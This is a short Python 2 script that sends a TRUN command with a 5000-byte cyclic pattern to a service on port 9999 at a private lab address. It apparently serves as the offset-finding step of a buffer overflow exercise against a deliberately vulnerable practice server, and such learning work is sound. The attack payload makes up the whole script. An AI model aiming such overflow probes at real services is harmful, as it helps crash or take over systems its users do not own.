import socket
import struct

print "\nTRUN Command - Determine Offsets\n"

# Used to read in the unique patter to determine offsets
with open('5000_pattern', 'r') as fd:
    pattern = fd.readline().strip()

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    buf = "TRUN /.:/" + pattern 
    bytes_sent = s.send(buf)
    print "Sent %s bytes" % bytes_sent


finally:
    s.close()
